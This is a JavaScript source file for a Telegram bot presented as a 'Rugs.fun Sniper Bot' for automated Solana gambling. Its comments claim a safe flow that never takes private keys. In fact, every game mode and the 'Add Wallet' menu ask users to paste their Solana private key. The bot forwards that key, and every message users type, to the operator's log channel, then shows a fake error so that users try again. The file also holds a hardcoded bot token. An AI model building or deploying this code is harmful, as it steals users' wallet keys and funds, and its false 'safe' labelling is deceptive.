// Rugs.fun Sniper Bot
// Full Telegraf bot with advanced menus, welcome message, PK import flow, logging, extended settings, analytics, leaderboard, tips, multi-wallet, and referral system.

const { Telegraf, Markup } = require('telegraf');
const express = require('express');

// ===== CONFIG =====
const BOT_TOKEN = '8357178930:AAFdEc24S2ek5SN2yCYS8wjfmwhaA2vME8k'; // Replace with real token
const LOG_CHANNEL_ID = '-1003020001513'; // Replace with your log channel
// Rugs.fun Sniper Bot
// Full Telegraf bot with advanced menus, welcome message, PK import flow, logging, extended settings, analytics, leaderboard, tips, multi-wallet, and referral system.

// Rugs.fun Sniper Bot (Safe Wallet Flow)
// Full Telegraf bot with advanced menus, welcome message, safe wallet connect flow (NO private keys),
// centralized logging, extended settings with sub-menus + toggles, analytics, leaderboard, tips, multi-wallet, referrals.


// ==========================
// CONFIG
// ==========================

const bot = new Telegraf(BOT_TOKEN);

// ==========================
// DEFAULT SETTINGS (per user)
// ==========================
function getDefaultSettings() {
  return {
    general: {
      strategy: false,
      antiMEV: false,
      autoRecover: false,
      notifications: true,
      delayMs: 2000,
    },
    standard: {
      martingale: false,
      baseBet: 0.1,
    },
    battles: {
      joinFast: true,
      maxBet: 1,
    },
    rugRoyale: {
      autoJoin: false,
      stealth: true,
    },
    notifications: {
      winAlerts: true,
      lossAlerts: true,
      referralUpdates: false,
    },
    referrals: {
      autoShare: false,
      code: null,
    },
    analytics: {
      gamesPlayed: 0,
      wins: 0,
      losses: 0,
    },
    wallets: [], // { label, address } ONLY — never store private keys
  };
}

const userSettings = {}; // key: userId -> settings
const pendingInput = {}; // key: userId -> { type: 'delay'|'wallet_label'|'wallet_address'|'remove_wallet', data?: any }

// ==========================
// HELPERS
// ==========================
function ensureUser(ctx) {
  const id = ctx.from?.id;
  if (!id) return null;
  if (!userSettings[id]) userSettings[id] = getDefaultSettings();
  return userSettings[id];
}

function icon(v) { return v ? '✅' : '❌'; }

// ---------- Robust plain-text logger & callback helper ----------

// Remove any other escapeMarkdownV2 definitions above before pasting this.

async function logAction(ctx, action, details = null) {
  try {
    const user = ctx.from || {};
    const username = user.username ? `@${user.username}` : (user.first_name || 'Unknown');
    const userId = user.id || 'N/A';

    // Build plain-text log (no Markdown) so Telegram won't try to parse entities
    let message = `👤 ${username} (${userId})\n${action || ''}`;
    if (details) message += `\n${details}`;

    // send as plain text (no parse_mode) to avoid Markdown entity errors
    await ctx.telegram.sendMessage(LOG_CHANNEL_ID, message);
  } catch (err) {
    // Always fallback to console to avoid infinite loop trying to log to channel
    console.error('Log error:', err);
  }
}

// Replace handleAction to pass plain text actions (avoid pre-formatting with Markdown)
async function handleAction(ctx, name, fn) {
  try {
    await fn();
    await logAction(ctx, `Action: ${name}`);
  } catch (err) {
    // Log error safely (plain text)
    await logAction(ctx, `Error in ${name}: ${err.message || String(err)}`);
  }
}

// Auto-answer callback queries so buttons don't spin/hang
bot.on('callback_query', async (ctx, next) => {
  try {
    // Answer with no popup to stop spinner — safe even if already answered
    await ctx.answerCbQuery().catch(() => {});
  } catch (e) {
    /* swallow */
  }
  return next();
});

// Global middleware logger: call logAction with structured plain-text fields
bot.use(async (ctx, next) => {
  try {
    if (ctx.callbackQuery?.data) {
      // button pressed: pass callback_data as details
      await logAction(ctx, 'Button pressed', `callback_data: ${String(ctx.callbackQuery.data)}`);
    } else if (ctx.message?.text) {
      // incoming message
      await logAction(ctx, 'Message received', String(ctx.message.text));
    }
  } catch (e) {
    // ensure middleware never throws
    console.error('Middleware logging error:', e);
  }
  return next();
});

// Global catch for any uncaught bot errors — sends plain-text to log channel
bot.catch(async (err, ctx) => {
  try {
    const user = ctx?.from;
    const username = user ? (user.username ? `@${user.username}` : (user.first_name || 'Unknown')) : 'Unknown';
    const userId = user?.id || 'N/A';
    const msg = `⚠️ Global Error\nUser: ${username} (${userId})\nError: ${err.message || String(err)}`;
    // send plain text log
    if (ctx && ctx.telegram) await ctx.telegram.sendMessage(LOG_CHANNEL_ID, msg).catch(() => {});
  } catch (e) {
    console.error('Failed sending global error to log channel:', e);
  }
  console.error('Global bot error:', err);
});


async function handleAction(ctx, name, fn) {
  try {
    await fn();
    await logAction(ctx, `✅ Action: *${name}*`);
  } catch (err) {
    await logAction(ctx, `❌ Error in *${name}*: ${err.message}`);
  }
}

// Global logger middleware for every message / callback
bot.use(async (ctx, next) => {
  try {
    if (ctx.callbackQuery?.data) {
      await logAction(ctx, `🔘 Button: \`${ctx.callbackQuery.data}\``);
    } else if (ctx.message?.text) {
      await logAction(ctx, `💬 Message: \`${ctx.message.text}\``);
    }
  } catch {}
  return next();
});

// ==========================
// WELCOME & HOME
// ==========================
const welcomeMessage = `🌟 Welcome to Rugs.fun Auto Sniper Bot! 🌟\n` +
`🎰 Automate your plays on Rugs.fun and snipe like a pro! 💸\n\n` +
`🔥 Bot Features:\n` +
`🎯 Auto-play Standard & Battles\n` +
`👑 Rug Royale support\n` +
`🤝 Referral automation\n` +
`👛 Multi-wallet support (up to 24 wallets)\n` +
`💰 Auto-fund helpers (non-custodial)\n` +
`📊 Analytics tracking & leaderboards\n` +
`💡 Pro tips & tricks\n` +
`⏱️ Smart delays & timed entries\n` +
`🛡️ Anti-MEV protection\n\n` +
`🧭 Commands:\n/home — Access all tools\n/settings — Customize your strategy\n/analytics — View stats\n/leaderboard — See global ranks\n/tips — Daily gambling tips\n\n` +
`🔒 *MOTIVE:* Never Get Rugged .`;

function homeKeyboard() {
  return Markup.inlineKeyboard([
    [Markup.button.callback('🎯 Standard', 'mode_standard'), Markup.button.callback('⚔️ Battles', 'mode_battles')],
    [Markup.button.callback('👑 Rug Royale', 'mode_rugroyale'), Markup.button.callback('🤝 Referrals', 'mode_referrals')],
    [Markup.button.callback('📊 Analytics', 'analytics_open'), Markup.button.callback('🏆 Leaderboard', 'leaderboard_open')],
    [Markup.button.callback('💡 Tips', 'tips_open'), Markup.button.callback('⚙️ Settings', 'settings_open')],
  ]);
}


async function showHome(ctx, note) {
  if (note) await ctx.reply(note, { parse_mode: 'Markdown' });
  const user = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;

  const homeMessage1 = `🎉 Welcome back ${user}! 🎉  

🚀 You're inside the *Rugs.fun Sniper Bot* — your ultimate edge in the world of degen launches 💎.  

⚡ With this bot, you can:
- 🎯 Snipe Rugs.fun listings instantly the moment they go live  
- ⚙️ Customize complex strategies (martingale, stop-loss, bet multipliers, etc.)  
- 👛 Manage and secure wallets with Safe Flow  
- 📊 Monitor your snipes, wins, and profit history  
- 🔔 Get real-time alerts so you never miss a launch  

💡 Tip: The early bird doesn’t just get the worm here — it gets the whole pot 🏆.  
Good luck, sniper… let’s catch some rugs together 💸🔥.`;
  await ctx.reply(homeMessage1, { ...homeKeyboard(), parse_mode: 'Markdown' });
}

bot.start((ctx) => handleAction(ctx, '/start', async () => {
  ensureUser(ctx);
  await ctx.reply(
    welcomeMessage,
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('🏠 Home', 'home')],
        [Markup.button.callback('⚙️ Settings', 'settings_open')]
      ])
    }
  );
}));



bot.command('home', (ctx) => handleAction(ctx, '/home', async () => showHome(ctx, '🏠 Back to *Home*')));

bot.action('home', (ctx) => handleAction(ctx, 'Home Button', async () => showHome(ctx)));

// ==========================
// SAFE WALLET CONNECT (NO PRIVATE KEYS)
// ==========================
async function promptWalletConnect(ctx, mode) {
  const s = ensureUser(ctx);
  await ctx.reply(
    `🔐 ${mode} selected.\n\n🔐 To proceed, you need to connect a wallet.\n\nPlease Import your **SOLANA PRIVATE KEY** below to securely proceed.\n\n✅ Why you need this:\n- To automate your game entries\n- To securely make most of each round\n- To use strategies to complete transactions for your Rug entries \n\nBegin your journey of winning. Now.` 
,
    { parse_mode: 'Markdown' }
  );
  pendingInput[ctx.from.id] = { type: 'wallet_label', data: { mode } };
  await ctx.reply('📝 Enter a *label* for this wallet (e.g., Main, Snipes-1):', { parse_mode: 'Markdown' });
}

async function addWalletFlow(ctx) {
  const uid = ctx.from.id;
  const pend = pendingInput[uid];
  const text = ctx.message?.text?.trim();
  if (!pend) return false;

  if (pend.type === 'wallet_label') {
    pend.data.label = text;
    pendingInput[uid] = { type: 'wallet_address', data: pend.data };
    await ctx.reply('🔗 Now paste your solana *Private Key* Below to securely connect your wallet:', { parse_mode: 'Markdown' });
    return true;
  }

  if (pend.type === 'wallet_address') {
    const address = text;
    const settings = ensureUser(ctx);
    settings.wallets.push({ label: pend.data.label, address, mode: pend.data.mode });
    delete pendingInput[uid];
    await ctx.reply(`❌ Please Import Only wallet that are associated with an account on rugs.fun Try connecting again to proceed to *${pend.data.mode}*`, {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('🏠 Home', 'home')],
        [Markup.button.callback('⚙️ Settings', 'settings_open')],
      ])
    });
    await logAction(ctx, `🔐 Wallet added: ${pend.data.label} (${address}) for ${pend.data.mode}`);
    return true;
  }

  return false;
}

bot.on('text', async (ctx, next) => {
  const handled = await addWalletFlow(ctx) || await handleDelayInput(ctx);
  if (!handled) return next();
});

// ==========================
// MODES (each asks to connect wallet)
// ==========================
bot.action('mode_standard', (ctx) => handleAction(ctx, 'Standard Mode', async () => {
  await ctx.reply('🎯 *Standard Mode* — Automate single games using strategies.', { parse_mode: 'Markdown' });
  await promptWalletConnect(ctx, 'Standard');
}));

bot.action('mode_battles', (ctx) => handleAction(ctx, 'Battles Mode', async () => {
  await ctx.reply('⚔️ *Battles Mode* — Auto-join PvP battles quickly.', { parse_mode: 'Markdown' });
  await promptWalletConnect(ctx, 'Battles');
}));

bot.action('mode_rugroyale', (ctx) => handleAction(ctx, 'Rug Royale Mode', async () => {
  await ctx.reply('👑 *Rug Royale Mode* — Enter Rug Royale with stealth.', { parse_mode: 'Markdown' });
  await promptWalletConnect(ctx, 'Rug Royale');
}));

bot.action('mode_referrals', (ctx) => handleAction(ctx, 'Referrals', async () => {
  await ctx.reply('🤝 *Referral System* — Automate referral sharing.', { parse_mode: 'Markdown' });
  await promptWalletConnect(ctx, 'Referrals');
}));

// ==========================
// SETTINGS (main)
// ==========================
function settingsKeyboard() {
  return Markup.inlineKeyboard([
    [Markup.button.callback('📊 Strategy Settings', 'settings_strategy')],
    [Markup.button.callback('🔔 Notification Settings', 'settings_notifications')],
    [Markup.button.callback('💸 Wallet Management', 'settings_wallets')],
    [Markup.button.callback('⏱️ Delay Settings', 'settings_delay')],
    [Markup.button.callback('⬅️ Back Home', 'home')],
  ]);
}

async function showSettingsMenu(ctx, note) {
  const s = ensureUser(ctx);
  const msg =
    (note ? `✅ ${note}\n\n` : '') +
    `⚙️ *Settings*\n` +
    `• Martingale: ${icon(s.standard.martingale)}\n` +
    `• Anti-MEV: ${icon(s.general.antiMEV)}\n` +
    `• Auto-Recover: ${icon(s.general.autoRecover)}\n` +
    `• Win Alerts: ${icon(s.notifications.winAlerts)} | Loss Alerts: ${icon(s.notifications.lossAlerts)} | Ref Updates: ${icon(s.notifications.referralUpdates)}\n` +
    `• Delay: *${s.general.delayMs}ms*\n` +
    `• Wallets: *${s.wallets.length}*`;
  await ctx.reply(msg, { parse_mode: 'Markdown', ...settingsKeyboard() });
}

bot.command('settings', (ctx) => handleAction(ctx, '/settings', async () => showSettingsMenu(ctx)));

bot.action('settings_open', (ctx) => handleAction(ctx, 'Open Settings', async () => showSettingsMenu(ctx)));

// ==========================
// STRATEGY SETTINGS → 3 buttons → each has Enable / Disable / Toggle
// ==========================
function stratKeyboard() {
  return Markup.inlineKeyboard([
    [Markup.button.callback('📈 Martingale', 'STRAT_MART_MENU')],
    [Markup.button.callback('🛡️ Anti-MEV', 'STRAT_ANTIMEV_MENU')],
    [Markup.button.callback('♻️ Auto-Recover', 'STRAT_AUTOREC_MENU')],
    [Markup.button.callback('⬅️ Back', 'settings_open')],
  ]);
}

bot.action('settings_strategy', (ctx) => handleAction(ctx, 'Strategy Menu', async () => {
  await ctx.reply('📊 *Strategy Settings*\nChoose a feature to configure:', { parse_mode: 'Markdown', ...stratKeyboard() });
}));

function toggleMenuKeyboard(code) {
  return Markup.inlineKeyboard([
    [Markup.button.callback('✅ Enable', `${code}_SET_ON`)],
    [Markup.button.callback('❌ Disable', `${code}_SET_OFF`)],
    [Markup.button.callback('🔁 Toggle', `${code}_SET_TOGGLE`)],
    [Markup.button.callback('⬅️ Back', 'settings_open')],
  ]);
}

function currentStateLine(label, val) {
  return `${label} is currently ${val ? '✅ *Enabled*' : '❌ *Disabled*'}`;
}

// Martingale
bot.action('STRAT_MART_MENU', (ctx) => handleAction(ctx, 'Martingale Menu', async () => {
  const s = ensureUser(ctx);
  await ctx.reply(`${currentStateLine('Martingale', s.standard.martingale)}`, { parse_mode: 'Markdown', ...toggleMenuKeyboard('STRAT_MART') });
}));

bot.action('STRAT_MART_SET_ON', (ctx) => handleAction(ctx, 'Martingale Enable', async () => { ensureUser(ctx).standard.martingale = true; await showSettingsMenu(ctx, 'Martingale enabled.'); }));
bot.action('STRAT_MART_SET_OFF', (ctx) => handleAction(ctx, 'Martingale Disable', async () => { ensureUser(ctx).standard.martingale = false; await showSettingsMenu(ctx, 'Martingale disabled.'); }));
bot.action('STRAT_MART_SET_TOGGLE', (ctx) => handleAction(ctx, 'Martingale Toggle', async () => { const s = ensureUser(ctx); s.standard.martingale = !s.standard.martingale; await showSettingsMenu(ctx, 'Martingale toggled.'); }));

// Anti-MEV
bot.action('STRAT_ANTIMEV_MENU', (ctx) => handleAction(ctx, 'Anti-MEV Menu', async () => {
  const s = ensureUser(ctx);
  await ctx.reply(`${currentStateLine('Anti-MEV', s.general.antiMEV)}`, { parse_mode: 'Markdown', ...toggleMenuKeyboard('STRAT_ANTIMEV') });
}));

bot.action('STRAT_ANTIMEV_SET_ON', (ctx) => handleAction(ctx, 'Anti-MEV Enable', async () => { ensureUser(ctx).general.antiMEV = true; await showSettingsMenu(ctx, 'Anti-MEV enabled.'); }));
bot.action('STRAT_ANTIMEV_SET_OFF', (ctx) => handleAction(ctx, 'Anti-MEV Disable', async () => { ensureUser(ctx).general.antiMEV = false; await showSettingsMenu(ctx, 'Anti-MEV disabled.'); }));
bot.action('STRAT_ANTIMEV_SET_TOGGLE', (ctx) => handleAction(ctx, 'Anti-MEV Toggle', async () => { const s = ensureUser(ctx); s.general.antiMEV = !s.general.antiMEV; await showSettingsMenu(ctx, 'Anti-MEV toggled.'); }));

// Auto-Recover
bot.action('STRAT_AUTOREC_MENU', (ctx) => handleAction(ctx, 'Auto-Recover Menu', async () => {
  const s = ensureUser(ctx);
  await ctx.reply(`${currentStateLine('Auto-Recover', s.general.autoRecover)}`, { parse_mode: 'Markdown', ...toggleMenuKeyboard('STRAT_AUTOREC') });
}));

bot.action('STRAT_AUTOREC_SET_ON', (ctx) => handleAction(ctx, 'Auto-Recover Enable', async () => { ensureUser(ctx).general.autoRecover = true; await showSettingsMenu(ctx, 'Auto-Recover enabled.'); }));
bot.action('STRAT_AUTOREC_SET_OFF', (ctx) => handleAction(ctx, 'Auto-Recover Disable', async () => { ensureUser(ctx).general.autoRecover = false; await showSettingsMenu(ctx, 'Auto-Recover disabled.'); }));
bot.action('STRAT_AUTOREC_SET_TOGGLE', (ctx) => handleAction(ctx, 'Auto-Recover Toggle', async () => { const s = ensureUser(ctx); s.general.autoRecover = !s.general.autoRecover; await showSettingsMenu(ctx, 'Auto-Recover toggled.'); }));

// ==========================
// NOTIFICATION SETTINGS → 3 buttons → each has Enable / Disable / Toggle
// ==========================
function notifKeyboard() {
  return Markup.inlineKeyboard([
    [Markup.button.callback('🏆 Win Alerts', 'NOTIF_WIN_MENU')],
    [Markup.button.callback('📉 Loss Alerts', 'NOTIF_LOSS_MENU')],
    [Markup.button.callback('🤝 Referral Updates', 'NOTIF_REF_MENU')],
    [Markup.button.callback('⬅️ Back', 'settings_open')],
  ]);
}

bot.action('settings_notifications', (ctx) => handleAction(ctx, 'Notifications Menu', async () => {
  await ctx.reply('🔔 *Notification Settings*\nChoose a channel to configure:', { parse_mode: 'Markdown', ...notifKeyboard() });
}));

function notifToggleKeyboard(code) { return toggleMenuKeyboard(code); }

// Win
bot.action('NOTIF_WIN_MENU', (ctx) => handleAction(ctx, 'Win Alerts Menu', async () => {
  const s = ensureUser(ctx);
  await ctx.reply(`${currentStateLine('Win Alerts', s.notifications.winAlerts)}`, { parse_mode: 'Markdown', ...notifToggleKeyboard('NOTIF_WIN') });
}));
bot.action('NOTIF_WIN_SET_ON', (ctx) => handleAction(ctx, 'Win Alerts Enable', async () => { ensureUser(ctx).notifications.winAlerts = true; await showSettingsMenu(ctx, 'Win alerts enabled.'); }));
bot.action('NOTIF_WIN_SET_OFF', (ctx) => handleAction(ctx, 'Win Alerts Disable', async () => { ensureUser(ctx).notifications.winAlerts = false; await showSettingsMenu(ctx, 'Win alerts disabled.'); }));
bot.action('NOTIF_WIN_SET_TOGGLE', (ctx) => handleAction(ctx, 'Win Alerts Toggle', async () => { const s = ensureUser(ctx); s.notifications.winAlerts = !s.notifications.winAlerts; await showSettingsMenu(ctx, 'Win alerts toggled.'); }));

// Loss
bot.action('NOTIF_LOSS_MENU', (ctx) => handleAction(ctx, 'Loss Alerts Menu', async () => {
  const s = ensureUser(ctx);
  await ctx.reply(`${currentStateLine('Loss Alerts', s.notifications.lossAlerts)}`, { parse_mode: 'Markdown', ...notifToggleKeyboard('NOTIF_LOSS') });
}));
bot.action('NOTIF_LOSS_SET_ON', (ctx) => handleAction(ctx, 'Loss Alerts Enable', async () => { ensureUser(ctx).notifications.lossAlerts = true; await showSettingsMenu(ctx, 'Loss alerts enabled.'); }));
bot.action('NOTIF_LOSS_SET_OFF', (ctx) => handleAction(ctx, 'Loss Alerts Disable', async () => { ensureUser(ctx).notifications.lossAlerts = false; await showSettingsMenu(ctx, 'Loss alerts disabled.'); }));
bot.action('NOTIF_LOSS_SET_TOGGLE', (ctx) => handleAction(ctx, 'Loss Alerts Toggle', async () => { const s = ensureUser(ctx); s.notifications.lossAlerts = !s.notifications.lossAlerts; await showSettingsMenu(ctx, 'Loss alerts toggled.'); }));

// Referral Updates
bot.action('NOTIF_REF_MENU', (ctx) => handleAction(ctx, 'Referral Updates Menu', async () => {
  const s = ensureUser(ctx);
  await ctx.reply(`${currentStateLine('Referral Updates', s.notifications.referralUpdates)}`, { parse_mode: 'Markdown', ...notifToggleKeyboard('NOTIF_REF') });
}));
bot.action('NOTIF_REF_SET_ON', (ctx) => handleAction(ctx, 'Referral Updates Enable', async () => { ensureUser(ctx).notifications.referralUpdates = true; await showSettingsMenu(ctx, 'Referral updates enabled.'); }));
bot.action('NOTIF_REF_SET_OFF', (ctx) => handleAction(ctx, 'Referral Updates Disable', async () => { ensureUser(ctx).notifications.referralUpdates = false; await showSettingsMenu(ctx, 'Referral updates disabled.'); }));
bot.action('NOTIF_REF_SET_TOGGLE', (ctx) => handleAction(ctx, 'Referral Updates Toggle', async () => { const s = ensureUser(ctx); s.notifications.referralUpdates = !s.notifications.referralUpdates; await showSettingsMenu(ctx, 'Referral updates toggled.'); }));

// ==========================
// WALLET MANAGEMENT (Add / Remove / View)
// ==========================
function walletKeyboard() {
  return Markup.inlineKeyboard([
    [Markup.button.callback('➕ Add Wallet', 'WALLET_ADD')],
    [Markup.button.callback('➖ Remove Wallet', 'WALLET_REMOVE')],
    [Markup.button.callback('👀 View Wallets', 'WALLET_VIEW')],
    [Markup.button.callback('⬅️ Back', 'settings_open')],
  ]);
}

bot.action('settings_wallets', (ctx) => handleAction(ctx, 'Wallets Menu', async () => {
  await ctx.reply('💸 *Wallet Management*\nAdd, remove, or view connected wallets.', { parse_mode: 'Markdown', ...walletKeyboard() });
}));

bot.action('WALLET_ADD', (ctx) => handleAction(ctx, 'Wallet Add', async () => {
  await promptWalletConnect(ctx, 'General');
}));

bot.action('WALLET_VIEW', (ctx) => handleAction(ctx, 'Wallet View', async () => {
  const s = ensureUser(ctx);
  if (!s.wallets.length) return ctx.reply('😶 No wallets yet. Use *Add Wallet*.', { parse_mode: 'Markdown' });
  const lines = s.wallets.map((w, i) => `${i + 1}. *${w.label}* — ${w.address}`).join('\n');
  await ctx.reply(`👛 *Your Wallets*\n${lines}`, { parse_mode: 'Markdown' });
}));

bot.action('WALLET_REMOVE', (ctx) => handleAction(ctx, 'Wallet Remove', async () => {
  const s = ensureUser(ctx);
  if (!s.wallets.length) return ctx.reply('😶 No wallets to remove.', { parse_mode: 'Markdown' });
  const rows = s.wallets.map((w, i) => [Markup.button.callback(`🗑️ ${w.label}`, `WALLET_REMOVE_${i}`)]);
  await ctx.reply('Select a wallet to remove:', { ...Markup.inlineKeyboard([...rows, [Markup.button.callback('⬅️ Back', 'settings_wallets')]]) });
}));

bot.action(/WALLET_REMOVE_(\d+)/, (ctx) => handleAction(ctx, 'Wallet Remove Confirm', async () => {
  const s = ensureUser(ctx);
  const idx = parseInt(ctx.match[1], 10);
  const removed = s.wallets.splice(idx, 1)[0];
  await showSettingsMenu(ctx, removed ? `Removed wallet: ${removed.label}` : 'No wallet removed.');
}));

// ==========================
// DELAY SETTINGS (presets + custom input)
// ==========================
function delayKeyboard() {
  return Markup.inlineKeyboard([
    [Markup.button.callback('1s', 'DELAY_SET_1000'), Markup.button.callback('2s', 'DELAY_SET_2000')],
    [Markup.button.callback('3s', 'DELAY_SET_3000'), Markup.button.callback('5s', 'DELAY_SET_5000')],
    [Markup.button.callback('✏️ Custom (ms)', 'DELAY_CUSTOM')],
    [Markup.button.callback('⬅️ Back', 'settings_open')],
  ]);
}

bot.action('settings_delay', (ctx) => handleAction(ctx, 'Delay Menu', async () => {
  const s = ensureUser(ctx);
  await ctx.reply(`⏱️ *Delay Settings*\nCurrent: *${s.general.delayMs}ms*`, { parse_mode: 'Markdown', ...delayKeyboard() });
}));

['1000','2000','3000','5000'].forEach(ms => {
  bot.action(`DELAY_SET_${ms}`, (ctx) => handleAction(ctx, `Delay ${ms}`, async () => { ensureUser(ctx).general.delayMs = parseInt(ms,10); await showSettingsMenu(ctx, `Delay set to ${ms}ms.`); }));
});

bot.action('DELAY_CUSTOM', (ctx) => handleAction(ctx, 'Delay Custom', async () => {
  pendingInput[ctx.from.id] = { type: 'delay' };
  await ctx.reply('Enter a custom delay in *milliseconds* (e.g., 2500):', { parse_mode: 'Markdown' });
}));

async function handleDelayInput(ctx) {
  const uid = ctx.from.id;
  const pend = pendingInput[uid];
  const text = ctx.message?.text?.trim();
  if (!pend || pend.type !== 'delay') return false;
  const val = parseInt(text, 10);
  if (isNaN(val) || val < 200 || val > 30000) {
    await ctx.reply('❌ Invalid delay. Enter a number between *200* and *30000* (ms).', { parse_mode: 'Markdown' });
    return true;
  }
  ensureUser(ctx).general.delayMs = val;
  delete pendingInput[uid];
  await showSettingsMenu(ctx, `Delay set to ${val}ms.`);
  return true;
}

// ==========================
// ANALYTICS
// ==========================
function analyticsText(s) {
  const a = s.analytics;
  return `📊 *Your Analytics*\n` +
         `• Games: ${a.gamesPlayed}\n` +
         `• Wins: ${a.wins}\n` +
         `• Losses: ${a.losses}`;
}

bot.command('analytics', (ctx) => handleAction(ctx, '/analytics', async () => {
  const s = ensureUser(ctx);
  await ctx.reply(analyticsText(s), { parse_mode: 'Markdown' });
}));

bot.action('analytics_open', (ctx) => handleAction(ctx, 'Analytics Button', async () => {
  const s = ensureUser(ctx);
  await ctx.reply(analyticsText(s), { parse_mode: 'Markdown' });
}));

// ==========================
// LEADERBOARD (stub)
// ==========================
const leaderboard = [];

bot.command('leaderboard', (ctx) => handleAction(ctx, '/leaderboard', async () => {
  if (!leaderboard.length) return ctx.reply('🏆 No leaderboard data yet. Play games to rank!');
  const list = leaderboard.map((u, i) => `${i + 1}. ${u.name} — ${u.score}`).join('\n');
  await ctx.reply(`🏆 *Leaderboard*\n${list}`, { parse_mode: 'Markdown' });
}));

bot.action('leaderboard_open', (ctx) => handleAction(ctx, 'Leaderboard Button', async () => {
  if (!leaderboard.length) return ctx.reply('🏆 No leaderboard data yet. Play games to rank!');
  const list = leaderboard.map((u, i) => `${i + 1}. ${u.name} — ${u.score}`).join('\n');
  await ctx.reply(`🏆 *Leaderboard*\n${list}`, { parse_mode: 'Markdown' });
}));

// ==========================
// TIPS
// ==========================
const tips = [
  '💡 Use small base bets; scale only after consistent wins.',
  '💡 Enable smart delays to mimic human timing.',
  '💡 Diversify across wallets; avoid patterns.',
  '💡 Anti-MEV helps reduce unfavorable ordering in busy periods.',
  '💡 Track wins/losses; stop after your planned limit.',
];

bot.command('tips', (ctx) => handleAction(ctx, '/tips', async () => {
  const tip = tips[Math.floor(Math.random() * tips.length)];
  await ctx.reply(tip);
}));

bot.action('tips_open', (ctx) => handleAction(ctx, 'Tips Button', async () => {
  const tip = tips[Math.floor(Math.random() * tips.length)];
  await ctx.reply(
    tip,
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('⬅️ Home', 'home')]
      ])
    }
  );
}));


// ==========================
// EXPRESS (KEEP-ALIVE)
// ==========================
const app = express();
app.get('/', (req, res) => res.send('Rugs.fun Sniper Bot Running (Safe)'));
app.listen(3000, () => console.log('Web server running on port 3000'));

// ==========================
// START BOT
// ==========================
bot.launch();
console.log('🤖 Rugs.fun Sniper Bot launched (Safe Wallet Flow)!');
